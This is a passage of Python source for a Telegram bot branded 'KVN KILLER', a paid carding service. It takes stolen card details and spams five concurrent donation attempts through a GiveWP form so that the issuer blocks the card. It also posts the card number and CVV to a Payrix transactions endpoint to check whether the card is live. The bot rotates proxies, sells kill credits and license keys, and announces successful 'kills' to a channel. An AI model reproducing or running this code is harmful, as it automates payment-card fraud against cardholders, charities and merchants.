            ) as resp:
                text = await resp.text()

            soup = BeautifulSoup(text, 'html.parser')
            el = soup.find('input', {'id': 'txnsession_key'})
            if not el:
                return "𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗳𝗶𝗻𝗱 𝘁𝘅𝗻𝘀𝗲𝘀𝘀𝗶𝗼𝗻_𝗸𝗲𝘆"
            try:
                txn_key = str(el).split('value="')[1].split('"')[0]
            except:
                return "𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗲𝘅𝘁𝗿𝗮𝗰𝘁 𝘁𝘅𝗻𝘀𝗲𝘀𝘀𝗶𝗼𝗻_𝗸𝗲𝘆"

            h2 = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                'Accept': "application/json, text/javascript, */*; q=0.01",
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                'sec-ch-ua-mobile': "?1",
                'x-requested-with': "XMLHttpRequest",
                'txnsessionkey': txn_key
            }
            payload = {
                'origin': "1", 'merchant': merchant, 'type': "2", 'total': "0",
                'description': "donate live site", 'payment[number]': card,
                'payment[cvv]': cvv, 'expiration': f"{mm}{yy}",
                'zip': "", 'last': "Tech"
            }
            async with session.post(
                "https://api.payrix.com/txns", data=payload, headers=h2,
                timeout=ClientTimeout(total=10), ssl=False
            ) as resp:
                j = await resp.json()
                errors = j.get('response', {}).get('errors', [])
                if errors:
                    msg = errors[0]['msg']
                    if "No 'To' Account Specified" in msg:
                        return "𝗖𝗮𝗿𝗱 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱\n𝗥𝗲𝗮𝘀𝗼𝗻: 𝗡𝗼𝘁 𝗳𝗼𝘂𝗻𝗱"
                    return msg
                return f"{ce('✅')} Approved"
        except Exception as e:
            logger.error(f"Payrix error: {e}")
            return "𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱"

    @staticmethod
    async def kill(card: str, mm: str, yy: str, cvv: str) -> dict:
        year_full = f"20{yy}" if len(yy) == 2 else yy
        expiration = f"{mm}{year_full[-2:]}"
        try:
            form_params = {
                'givewp-route': "donation-form-view",
                'form-id': SITE_CONFIG["form_id"]
            }
            session = await session_mgr.get_session()
            async with session.get(
                SITE_CONFIG["base_url"], params=form_params,
                headers=get_form_headers(),
                timeout=ClientTimeout(total=30), ssl=False
            ) as resp:
                sig, exp_t = extract_signatures(await resp.text()) if resp.status == 200 else (None, None)

            if not sig or not exp_t:
                err_emoji = ce('❌')
                return {
                    "status": "ERROR",
                    "response": "Form signature missing",
                    "gateway": "Killer",
                    "killer_status": f"Error {err_emoji}"
                }

            donation_params = {
                'givewp-route': "donate",
                'givewp-route-signature': sig,
                'givewp-route-signature-id': "givewp-donate",
                'givewp-route-signature-expiration': exp_t
            }

            tasks = [
                KillerGateway.donation_attempt(card, expiration, donation_params, i + 1)
                for i in range(5)
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            results = [r if isinstance(r, bool) else True for r in results]
            declined = sum(1 for r in results if r is True)
            is_killed = (declined == 5)
            ok_emoji = ce('✅')
            killer_status = f"KILLED {ok_emoji}" if is_killed else "Maybe Live?"

            payrix_result = await KillerGateway.payrix_check(card, mm, yy, cvv)
            return {
                "status": "KILLED" if is_killed else "LIVE",
                "response": payrix_result,
                "gateway": "Killer",
                "killer_status": killer_status
            }
        except Exception as e:
            err_emoji = ce('❌')
            return {
                "status": "ERROR",
                "response": str(e),
                "gateway": "Killer",
                "killer_status": f"Error {err_emoji}"
            }

# ═══════════════════════════════════════
# UI FORMATTERS — PRINCE CHECKER STYLE
# ═══════════════════════════════════════
def strip_html(text: str) -> str:
    return re.sub(r'<[^>]+>', '', text)

def sep_mid() -> str:
    star = ce('⭐')
    return f"「 {star} 」「 {star} 」「 {star} 」"

def sep_short() -> str:
    star = ce('⭐')
    return f"「 {star} 」「 {star} 」"

def sep_mini() -> str:
    star = ce('⭐')
    return f"「 {star} 」"

def loading_bar(percent: int, label: str) -> str:
    filled = percent // 10
    bar = "▰" * filled + "▱" * (10 - filled)
    return f"⟦ {bar} ⟧ <b>{percent}%</b> — <i>{label}</i>"

def box_title(text: str, width: int = 38) -> str:
    line = "═" * width
    visual_len = len(strip_html(text))
    padding = max(0, (width - 5) - visual_len)
    left_pad = padding // 2
    right_pad = padding - left_pad
    return f"╔{line}╗\n║ {' '*left_pad}<b>{text}</b>{' '*right_pad} ║\n╚{line}╝"

def format_kill_result(card, mm, yy, cvv, result, bin_info, user_name, elapsed, credits_left):
    ks = result.get('killer_status', 'Unknown')
    if "KILLED" in ks:
        status_emoji = ce("💔")
        status_color = "𝗞𝗜𝗟𝗟𝗘𝗗"
    elif "Live" in ks:
        status_emoji = ce("⚡")
        status_color = "𝗠𝗔𝗬𝗕𝗘 𝗟𝗜𝗩𝗘"
    else:
        status_emoji = ce("❌")
        status_color = "𝗘𝗥𝗥𝗢𝗥"

    e_card = ce('💳')
    e_tag = ce('🏷')
    e_bank = ce('🏦')
    e_globe = ce('🌍')
    e_card1 = ce('💳1')
    e_link = ce('🔗')
    e_clock = ce('⏱')
    e_money = ce('💰')
    e_alien = ce('👽')
    e_bolt = ce('⚡')
    
    title_str = f"{e_bolt} KVN KILLER v{VERSION} {e_bolt}"
    title = box_title(title_str)

    return (
        f"{title}\n\n"
        f"{e_card} <code>{card}|{mm}|{yy}|{cvv}</code>\n"
        f"{sep_short()}\n"
        f"{e_tag} 𝗕𝗿𝗮𝗻𝗱 ▸ <b>{bin_info.brand.upper()}</b>\n"
        f"{e_bank} 𝗕𝗮𝗻𝗸  ▸ <b>{bin_info.bank}</b>\n"
        f"{e_globe} 𝗥𝗲𝗴𝗶𝗼𝗻 ▸ <b>{bin_info.country}</b>\n"
        f"{e_card1} 𝗧𝘆𝗽𝗲  ▸ <b>{bin_info.type}</b> / <b>{bin_info.sub_type}</b>\n"
        f"{sep_mid()}\n"
        f"{status_emoji} <b>{status_color}</b>\n"
        f"{e_link} 𝗔𝘂𝘁𝗵 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ▸ <b>{result['response']}</b>\n"
        f"{sep_mid()}\n"
        f"{e_clock} 𝗘𝗹𝗮𝗽𝘀𝗲𝗱 ▸ <code>{elapsed}s</code>\n"
        f"{e_money} 𝗖𝗿𝗲𝗱𝗶𝘁𝘀   ▸ <code>{credits_left}</code>\n"
        f"{e_alien} 𝗢𝗽𝗲𝗿𝗮𝘁𝗼𝗿 ▸ <b>{user_name}</b>\n"
        f"{sep_mini()}"
    )

def format_channel_hit(user_name, card_masked, result):
    e_alien = ce('👽')
    e_heart = ce('💔')
    e_card = ce('💳')
    e_chat = ce('💬')
    
    title_str = f"{e_heart} CARD KILLED {e_heart}"
    title = box_title(title_str)

    return (
        f"{title}\n\n"
        f"{e_alien} 𝗨𝘀𝗲𝗿    ▸ <b>{user_name}</b>\n"
        f"{e_heart} 𝗦𝘁𝗮𝘁𝘂𝘀   ▸ <b>KILLED</b>\n"
        f"{e_card} 𝗖𝗮𝗿𝗱    ▸ <code>{card_masked}</code>\n"
        f"{e_chat} 𝗥𝗲𝘀𝗽    ▸ <b>{result['response']}</b>\n"
        f"{sep_mini()}\n"
        f"{e_alien} @{user_name}"
    )

def format_plan(user_id: int) -> str:
    user = db.get_user(user_id)
    if not user:
        return f"{ce('❌')} User not found."
    expiry = user.plan_expiry
    days = 0
    if expiry:
        try:
            dt = datetime.fromisoformat(expiry)
            days = max(0, (dt - datetime.now()).days)
        except:
            pass
    active = f"{ce('✅')} Active" if days > 0 else f"{ce('❌')} Expired"
    
    e_crown = ce('👑')
    e_clock = ce('⏰')
    e_bolt = ce('⚡')
    e_money = ce('💰')
    e_heart = ce('💔')
    
    title_str = f"{e_crown} PLAN INFO {e_crown}"
    title = box_title(title_str)

    return (
        f"{title}\n\n"
        f"╭─❲ 𝗦𝗧𝗔𝗧𝗨𝗦 ❳\n"
        f"├» <b>{active}</b>\n"
        f"├» {e_clock} 𝗘𝘅𝗽𝗶𝗿𝗲𝘀: <code>{expiry[:10] if expiry else 'N/A'}</code>\n"
        f"├» 📅 𝗗𝗮𝘆𝘀 𝗟𝗲𝗳𝘁: <b>{days}</b>\n"
        f"╰───────────\n\n"
        f"╭─❲ 𝗞𝗜𝗟𝗟𝗘𝗥 ❳\n"
        f"├» {e_bolt} <code>/kill</code> CC|MM|YY|CVV\n"
        f"╰───────────\n\n"
        f"╭─❲ 𝗦𝗧𝗔𝗧𝗦 ❳\n"
        f"├» {e_money} 𝗖𝗿𝗲𝗱𝗶𝘁𝘀: <code>{user.kill_credits}</code>\n"
        f"├» {e_heart} 𝗞𝗶𝗹𝗹𝘀: <code>{user.kill_count}</code>\n"
        f"╰───────────"
    )

def format_profile(user_id: int) -> str:
    user = db.get_user(user_id)
    if not user:
        return f"{ce('❌')} User not found."
    expiry = user.plan_expiry
    days = 0
    if expiry:
        try:
            dt = datetime.fromisoformat(expiry)
            days = max(0, (dt - datetime.now()).days)
        except:
            pass
    active = f"{ce('✅')} Active" if days > 0 else f"{ce('❌')} Expired"
    
    e_person = ce('👤')
    e_crown = ce('👑')
    e_money = ce('💰')
    e_heart = ce('💔')
    
    title_str = f"{e_person} PROFILE {e_person}"
    title = box_title(title_str)

    return (
        f"{title}\n\n"
        f"╭─❲ 𝗨𝗦𝗘𝗥 ❳\n"
        f"├» 🆔 𝗜𝗗: <code>{user.user_id}</code>\n"
        f"├» 📛 𝗡𝗮𝗺𝗲: <b>{user.first_name or 'N/A'}</b>\n"
        f"├» 📞 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{user.username or 'N/A'}\n"
        f"╰───────────\n\n"
        f"╭─❲ 𝗣𝗟𝗔𝗡 ❳\n"
        f"├» {e_crown} 𝗦𝘁𝗮𝘁𝘂𝘀: <b>{active}</b>\n"
        f"├» 📅 𝗗𝗮𝘆𝘀: <b>{days}</b>\n"
        f"╰───────────\n\n"
        f"╭─❲ 𝗦𝗧𝗔𝗧𝗦 ❳\n"
        f"├» {e_money} 𝗖𝗿𝗲𝗱𝗶𝘁𝘀: <code>{user.kill_credits}</code>\n"
        f"├» {e_heart} 𝗞𝗶𝗹𝗹𝘀: <code>{user.kill_count}</code>\n"
        f"╰───────────"
    )

def format_bin_lookup(bin_info: BINInfo) -> str:
    e_card = ce('💳')
    e_tag = ce('🏷')
    e_card2 = ce('💳2')
    e_bank = ce('🏦')
    e_globe = ce('🌍')
    
    title_str = "🔍 BIN LOOKUP 🔍"
    title = box_title(title_str)

    return (
        f"{title}\n\n"
        f"╭─❲ 𝗕𝗜𝗡 ❳\n"
        f"├» {e_card} 𝗕𝗜𝗡: <code>{bin_info.bin}</code>\n"
        f"╰───────────\n\n"
        f"╭─❲ 𝗜𝗡𝗙𝗢 ❳\n"
        f"├» {e_tag} 𝗕𝗿𝗮𝗻𝗱: <b>{bin_info.brand.upper()}</b>\n"
        f"├» {e_card2} 𝗧𝘆𝗽𝗲: <b>{bin_info.type}</b>\n"
        f"├» 📋 𝗦𝘂𝗯: <b>{bin_info.sub_type}</b>\n"
        f"├» {e_bank} 𝗕𝗮𝗻𝗸: <b>{bin_info.bank}</b>\n"
        f"├» {e_globe} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <b>{bin_info.country}</b>\n"
        f"╰───────────"
    )

def format_menu(user_id: int, is_owner: bool = False) -> str:
    user = db.get_user(user_id)
    if not user:
        return "User not found."
        
    e_gear = ce('⚙️')
    e_heart = ce('💔')
    e_bolt = ce('⚡')
    e_pc = ce('💻')
    e_person = ce('👤')
    e_crown = ce('👑')
    e_money = ce('💰')
    e_link = ce('🔗')
    e_bolt1 = ce('⚡1')
    e_warn = ce('⚠️')
    e_ok = ce('✅')
    
    plan_status = f"{e_ok} Premium" if db.has_active_plan(user_id) else "❌ Free"
    credits = user.kill_credits
    if user_id == OWNER_ID:
        credits = "∞"
        plan_status = f"{e_crown} Owner"
        
    title_str = f"{e_gear} KVN KILLER v{VERSION} {e_gear}"
    title = box_title(title_str)
    
    base = (
        f"{title}\n\n"
        f"╭─❲ 𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡 ❳\n"
        f"├» {e_crown} 𝗦𝘁𝗮𝘁𝘂𝘀: <b>{plan_status}</b>\n"
        f"├» {e_money} 𝗞𝗶𝗹𝗹 𝗖𝗿𝗲𝗱𝗶𝘁𝘀: <code>{credits}</code>\n"
        f"╰───────────\n\n"
        f"╭─❲ 𝗞𝗜𝗟𝗟𝗘𝗥 ❳\n"
        f"├» {e_heart} <code>/kill</code> CC|MM|YY|CVV\n"
        f"╰───────────\n\n"
        f"╭─❲ 𝗧𝗢𝗢𝗟𝗦 ❳\n"
        f"├» 🔍 <code>/bin</code>  ▸ BIN Lookup\n"
        f"├» {e_person} <code>/me</code>   ▸ Your Profile\n"
        f"├» 🆔 <code>/id</code>   ▸ Get User ID\n"
        f"├» 🔑 <code>/redeem</code>  ▸ Redeem Key\n"
        f"╰───────────\n"
    )
    if is_owner:
        base += (
            f"\n╭─❲ 𝗔𝗗𝗠𝗜𝗡 ❳\n"
            f"├» {e_person} <code>/grant ID DAYS</code> ▸ Grant Plan\n"
            f"├» {e_bolt1} <code>/grantkiller ID CREDITS</code>\n"
            f"├» 🔑 <code>/keygen DAYS [count]</code>\n"
            f"├» 🚫 <code>/ban</code> / <code>/unban</code> / <code>/banlist</code>\n"
            f"├» 📢 <code>/broadcast</code> ▸ Mass Message\n"
            f"├» 📊 <code>/stats</code> ▸ Bot Stats\n"
            f"├» {e_link} <code>/proxy</code> ▸ Add Proxy\n"
            f"├» 🌐 <code>/proxies</code> ▸ View Proxies\n"
            f"╰───────────\n"
        )
    base += f"\n{e_warn} Use responsibly."
    return base

# ═══════════════════════════════════════
# INLINE KEYBOARDS
# ═══════════════════════════════════════
def menu_keyboard(is_owner: bool = False) -> InlineKeyboardMarkup:
    buttons = [
        [InlineKeyboardButton("❲ 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 ❳", callback_data="nav_me"),
         InlineKeyboardButton("❲ 𝗣𝗟𝗔𝗡 ❳", callback_data="nav_plan")],
        [InlineKeyboardButton("❲ 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 ❳", callback_data="nav_credits"),
         InlineKeyboardButton("❲ 𝗕𝗜𝗡 ❳", callback_data="nav_bin")],
    ]
    if is_owner:
        buttons.append([InlineKeyboardButton("❲ 𝗔𝗗𝗠𝗜𝗡 ❳", callback_data="nav_admin")])
    return InlineKeyboardMarkup(buttons)

def admin_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❲ 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗦 ❳", callback_data="admin_stats"),
         InlineKeyboardButton("❲ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 ❳", callback_data="admin_broadcast")],
        [InlineKeyboardButton("❲ 𝗞𝗘𝗬 𝗚𝗘𝗡 ❳", callback_data="admin_keygen"),
         InlineKeyboardButton("❲ 𝗕𝗔𝗡 𝗟𝗜𝗦𝗧 ❳", callback_data="admin_banlist")],
        [InlineKeyboardButton("❲ 𝗥𝗘𝗟𝗢𝗔𝗗 ❳", callback_data="admin_reload"),
         InlineKeyboardButton("❲ 𝗣𝗥𝗢𝗫𝗬 𝗟𝗜𝗦𝗧 ❳", callback_data="admin_proxylist")],
        [InlineKeyboardButton("❲ 𝗕𝗔𝗖𝗞 ❳", callback_data="nav_menu")]
    ])

def back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❲ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗘𝗡𝗨 ❳", callback_data="nav_menu")]
    ])

# ═══════════════════════════════════════
# HANDLERS
# ═══════════════════════════════════════
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    db.ensure_user(u.id, u.username or "", u.first_name or "")
    is_owner = (u.id == OWNER_ID)
    await update.message.reply_text(format_menu(u.id, is_owner), parse_mode=ParseMode.HTML,
                                   reply_markup=menu_keyboard(is_owner))

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    u = query.from_user
    db.ensure_user(u.id, u.username or "", u.first_name or "")
    is_owner = (u.id == OWNER_ID)

    if data == "nav_menu":
        await query.edit_message_text(format_menu(u.id, is_owner),
            parse_mode=ParseMode.HTML, reply_markup=menu_keyboard(is_owner))

    elif data == "nav_kill":
        e_bolt = ce('⚡')
        e_heart = ce('💔')
        title_str = f"{e_bolt} KILL CARD {e_bolt}"
        title = box_title(title_str)
        await query.edit_message_text(
            f"{title}\n\n"
            f"╭─❲ 𝗨𝗦𝗔𝗚𝗘 ❳\n"
            f"├» <code>/kill 4111111111111111|12|25|123</code>\n"
            f"╰───────────\n\n"
            f"╭─❲ 𝗜𝗡𝗙𝗢 ❳\n"
            f"├» Spams 5 donation attempts + Payrix check\n"
            f"├» {e_heart} Requires kill credits\n"
            f"╰───────────",
            parse_mode=ParseMode.HTML, reply_markup=back_keyboard())

    elif data == "nav_bin":
        title_str = "🔍 BIN LOOKUP 🔍"
        title = box_title(title_str)
        await query.edit_message_text(
            f"{title}\n\n"
            f"╭─❲ 𝗨𝗦𝗔𝗚𝗘 ❳\n"
            f"├» <code>/bin 411111</code>\n"
            f"├» <code>/bin 453956</code>\n"
            f"╰───────────\n\n"
            f"╭─❲ 𝗜𝗡𝗙𝗢 ❳\n"
            f"├» Looks up brand, bank, type, country\n"
            f"╰───────────",
            parse_mode=ParseMode.HTML, reply_markup=back_keyboard())

    elif data == "nav_me":
        await query.edit_message_text(format_profile(u.id),
            parse_mode=ParseMode.HTML, reply_markup=back_keyboard())

    elif data == "nav_plan":
        await query.edit_message_text(format_plan(u.id), parse_mode=ParseMode.HTML,
                                     reply_markup=back_keyboard())

    elif data == "nav_credits":
        e_money = ce('💰')
        title_str = f"{e_money} CREDITS {e_money}"
        title = box_title(title_str)
        credits = db.get_credits(u.id)
        await query.edit_message_text(
            f"{title}\n\n"
            f"╭─❲ 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 ❳\n"
            f"├» {e_money} 𝗖𝗿𝗲𝗱𝗶𝘁𝘀: <code>{credits}</code>\n"
            f"╰───────────",
            parse_mode=ParseMode.HTML, reply_markup=back_keyboard())

    elif data == "nav_admin":
        if not is_owner:
            await query.edit_message_text("⛔ Owner only.", parse_mode=ParseMode.HTML,
                                          reply_markup=back_keyboard())
            return
        title_str = "🛡️ ADMIN PANEL 🛡️"
        title = box_title(title_str)
        await query.edit_message_text(
            f"{title}\n\n"
            f"╭─❲ 𝗔𝗖𝗧𝗜𝗢𝗡𝗦 ❳\n"
            f"├» Select an action below\n"
            f"╰───────────",
            parse_mode=ParseMode.HTML, reply_markup=admin_keyboard())

    elif data == "admin_stats":
        s = db.get_stats()
        active_u = db._exec("SELECT COUNT(*) FROM users WHERE is_banned = 0")[0][0]
        banned_u = db._exec("SELECT COUNT(*) FROM users WHERE is_banned = 1")[0][0]
        with_plan = db._exec("SELECT COUNT(*) FROM users WHERE plan_expiry IS NOT NULL AND plan_expiry > ?",
                             (datetime.now().isoformat(),))[0][0]
        total_kills = s["kills"]
        total_credits = db._exec("SELECT SUM(kill_credits) FROM users")[0][0] or 0
        pa = await proxy_pool.count_active()
        pt = await proxy_pool.count_total()
        
        e_ok = ce('✅')
        e_crown = ce('👑')
        e_heart = ce('💔')
        e_money = ce('💰')
        
        title_str = "📊 BOT STATS 📊"
        title = box_title(title_str)
        
        await query.edit_message_text(
            f"{title}\n\n"
            f"╭─❲ 𝗨𝗦𝗘𝗥𝗦 ❳\n"
            f"├» 👥 𝗧𝗼𝘁𝗮𝗹: <code>{s['users']}</code>\n"
            f"├» {e_ok} 𝗔𝗰𝘁𝗶𝘃𝗲: <code>{active_u}</code>\n"
            f"├» 🚫 𝗕𝗮𝗻𝗻𝗲𝗱: <code>{banned_u}</code>\n"
            f"├» {e_crown} 𝗪𝗶𝘁𝗵 𝗣𝗹𝗮𝗻: <code>{with_plan}</code>\n"
            f"╰───────────\n\n"
            f"╭─❲ 𝗦𝗬𝗦𝗧𝗘𝗠 ❳\n"
            f"├» {e_heart} 𝗧𝗼𝘁𝗮𝗹 𝗞𝗶𝗹𝗹𝘀: <code>{total_kills}</code>\n"
            f"├» {e_money} 𝗖𝗿𝗲𝗱𝗶𝘁𝘀: <code>{total_credits}</code>\n"
            f"╰───────────\n\n"
            f"╭─❲ 𝗣𝗥𝗢𝗫𝗜𝗘𝗦 ❳\n"
            f"├» 🌐 𝗔𝗰𝘁𝗶𝘃𝗲: <code>{pa}/{pt}</code>\n"
            f"╰───────────",
            parse_mode=ParseMode.HTML, reply_markup=admin_keyboard())

    elif data == "admin_reload":
        await proxy_pool.reload()
        count = await proxy_pool.count_active()
        title_str = "🔄 RELOADED 🔄"
        title = box_title(title_str)
        await query.edit_message_text(
            f"{title}\n\n"
            f"╭─❲ 𝗦𝗧𝗔𝗧𝗨𝗦 ❳\n"
            f"├» 🌐 𝗔𝗰𝘁𝗶𝘃𝗲 𝗣𝗿𝗼𝘅𝗶𝗲𝘀: <code>{count}</code>\n"
            f"╰───────────",
            parse_mode=ParseMode.HTML, reply_markup=admin_keyboard())

    elif data == "admin_banlist":
        rows = db._exec("SELECT user_id, username FROM users WHERE is_banned = 1")
        title_str = "🚫 BANLIST 🚫"
        title = box_title(title_str)
        if not rows:
            msg = f"{title}\n\n╭─❲ 𝗦𝗧𝗔𝗧𝗨𝗦 ❳\n├» No banned users.\n╰───────────"
        else:
            msg = f"{title}\n\n╭─❲ 𝗕𝗔𝗡𝗡𝗘𝗗 ❳\n"
            for r in rows:
                msg += f"├» <code>{r[0]}</code> — {r[1] or 'N/A'}\n"
            msg += "╰───────────"
        await query.edit_message_text(msg, parse_mode=ParseMode.HTML,
                                      reply_markup=admin_keyboard())

    elif data == "admin_proxylist":
        proxies = await proxy_pool.list_all()
        title_str = "🌐 PROXY LIST 🌐"
        title = box_title(title_str)
        if not proxies:
            msg = f"{title}\n\n╭─❲ 𝗦𝗧𝗔𝗧𝗨𝗦 ❳\n├» No proxies in database.\n╰───────────"
        else:
            msg = f"{title}\n\n╭─❲ 𝗣𝗥𝗢𝗫𝗜𝗘𝗦 ❳\n"
            for idx, p in enumerate(proxies[:20]):
                status = ce("🟢") if p.get("is_active") else "🔴"
                fc = p.get("fail_count", 0)
                sc = p.get("success_count", 0)
                msg += f"├» {idx}. <code>{p['proxy_string']}</code> {status} (F:{fc} S:{sc})\n"
            if len(proxies) > 20:
                msg += f"├» ... and {len(proxies)-20} more\n"
            msg += "╰───────────"
        await query.edit_message_text(msg, parse_mode=ParseMode.HTML,
                                     reply_markup=admin_keyboard())

    elif data == "admin_broadcast":
        title_str = "📢 BROADCAST 📢"
        title = box_title(title_str)
        await query.edit_message_text(
            f"{title}\n\n"
            f"╭─❲ 𝗨𝗦𝗔𝗚𝗘 ❳\n"
            f"├» <code>/broadcast Your message here</code>\n"
            f"╰───────────",
            parse_mode=ParseMode.HTML, reply_markup=admin_keyboard())

    elif data == "admin_keygen":
        title_str = "🔑 KEY GENERATOR 🔑"
        title = box_title(title_str)
        await query.edit_message_text(
            f"{title}\n\n"
            f"╭─❲ 𝗨𝗦𝗔𝗚𝗘 ❳\n"
            f"├» <code>/keygen DAYS [count]</code>\n"
            f"╰───────────\n\n"
            f"╭─❲ 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 ❳\n"
            f"├» <code>/keygen 30</code> — 1 key, 30 days\n"
            f"├» <code>/keygen 7 5</code> — 5 keys, 7 days each\n"
            f"╰───────────",
            parse_mode=ParseMode.HTML, reply_markup=admin_keyboard())

async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    db.ensure_user(u.id, u.username or "", u.first_name or "")
    if db.is_banned(u.id):
        await update.message.reply_text("⛔ You are banned.")
        return
    if u.id != OWNER_ID and not db.deduct_kill_credit(u.id):
        await update.message.reply_text(f"{ce('⚠️')} No kill credits left. Contact admin.")
        return

    allowed, wait = await rate_limiter.check(u.id, cooldown=5.0)
    if not allowed:
        await update.message.reply_text(f"⏳ Rate limited. Wait <b>{wait}s</b>", parse_mode=ParseMode.HTML)
        return

    text = " ".join(context.args) if context.args else ""
    if not text and update.message.reply_to_message:
        text = update.message.reply_to_message.text
    parsed = parse_cc(text)
    if not parsed:
        await update.message.reply_text(
            f"{ce('❌')} Invalid format.\n\nUsage: <code>/kill 4111111111111111|12|25|123</code>",
            parse_mode=ParseMode.HTML)
        return
    card, mm, yy, cvv = parsed
    if card[:6] in BANNED_BINS:
        await update.message.reply_text(f"⛔ BIN <code>{card[:6]}</code> is restricted.",
                                        parse_mode=ParseMode.HTML)
        return

    e_bolt = ce('⚡')
    title_str = f"{e_bolt} KVN KILLER {e_bolt}"
    title = box_title(title_str)

    loading = await update.message.reply_text(
        f"{title}\n\n{loading_bar(10, 'Initializing Sequence...')}",
        parse_mode=ParseMode.HTML)
    start = time.time()

    await loading.edit_text(
        f"{title}\n\n{loading_bar(30, 'Engaging Target...')}",
        parse_mode=ParseMode.HTML)

    session = await session_mgr.get_session()
    bin_info = await bin_lookup(card, session, None)

    await loading.edit_text(
        f"{title}\n\n{loading_bar(50, 'Spamming Gateways...')}",
        parse_mode=ParseMode.HTML)
    result = await KillerGateway.kill(card, mm, yy, cvv)

    await loading.edit_text(
        f"{title}\n\n{loading_bar(80, 'Payrix Check...')}",
        parse_mode=ParseMode.HTML)

    elapsed = round(time.time() - start, 2)
    credits_left = "∞" if u.id == OWNER_ID else db.get_credits(u.id)

    await loading.edit_text(
        format_kill_result(card, mm, yy, cvv, result, bin_info,
                          u.first_name or "User", elapsed, credits_left),
        parse_mode=ParseMode.HTML)

    if result.get("status") == "KILLED":
        masked = f"{card[:6]}XXXXXXXXXX|XX|XX|XXX"
        chan_text = format_channel_hit(u.username or u.first_name or "User", masked, result)
        try:
            await context.bot.send_message(HIT_CHANNEL_ID, chan_text, parse_mode=ParseMode.HTML)
        except Exception as e:
            logger.error(f"Channel forward failed: {e}")

async def plan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    db.ensure_user(u.id, u.username or "", u.first_name or "")
    await update.message.reply_text(format_plan(u.id), parse_mode=ParseMode.HTML)

async def profile_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    db.ensure_user(u.id, u.username or "", u.first_name or "")
    await update.message.reply_text(format_profile(u.id), parse_mode=ParseMode.HTML)

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    e_person = ce('👤')
    title_str = "🆔 USER ID 🆔"
    title = box_title(title_str)
    await update.message.reply_text(
        f"{title}\n\n"
        f"╭─❲ 𝗬𝗢𝗨𝗥 𝗜𝗗 ❳\n"
        f"├» {e_person} 𝗜𝗗: <code>{u.id}</code>\n"
        f"├» 📛 𝗡𝗮𝗺𝗲: <b>{u.first_name or 'N/A'}</b>\n"
        f"├» 📞 𝗨𝘀𝗲𝗿: @{u.username or 'N/A'}\n"
        f"╰───────────",
        parse_mode=ParseMode.HTML)

async def bin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            f"Usage: <code>/bin 411111</code>", parse_mode=ParseMode.HTML)
        return
    bin_input = context.args[0].strip()
    if not bin_input.isdigit() or len(bin_input) < 6:
        await update.message.reply_text(f"{ce('❌')} BIN must be 6+ digits.")
        return
    bin_str = bin_input[:6]
    title_str = "🔍 BIN LOOKUP 🔍"
    title = box_title(title_str)
    msg = await update.message.reply_text(
        f"{title}\n\n{loading_bar(50, 'Looking up...')}",
        parse_mode=ParseMode.HTML)
    session = await session_mgr.get_session()
    bin_info = await bin_lookup(bin_str + "0000000000", session, None)
    await msg.edit_text(format_bin_lookup(bin_info), parse_mode=ParseMode.HTML)

async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    text = update.message.text
    lines = text.split("\n")[1:] if "\n" in text else context.args
    if not lines:
        await update.message.reply_text(
            f"Send proxies after the command:\n"
            f"<code>/proxy\nip:port\nhost:port:user:pass</code>",
            parse_mode=ParseMode.HTML)
        return
    added = 0
    for line in lines:
        line = line.strip()
        if line and await proxy_pool.add(line):
            added += 1
    await update.message.reply_text(
        f"{ce('✅')} Added <b>{added}</b> proxies.", parse_mode=ParseMode.HTML)

async def list_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    proxies = await proxy_pool.list_all()
    title_str = "🌐 PROXIES 🌐"
    title = box_title(title_str)
    if not proxies:
        await update.message.reply_text("No proxies in database.")
        return
    msg = f"{title}\n\n╭─❲ 𝗣𝗥𝗢𝗫𝗜𝗘𝗦 ❳\n"
    for idx, p in enumerate(proxies[:20]):
        status = ce("🟢") if p.get("is_active") else "🔴"
        fc = p.get("fail_count", 0)
        sc = p.get("success_count", 0)
        msg += f"├» {idx}. <code>{p['proxy_string']}</code> {status} (F:{fc} S:{sc})\n"
    if len(proxies) > 20:
        msg += f"├» ... and {len(proxies)-20} more\n"
    msg += "╰───────────"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

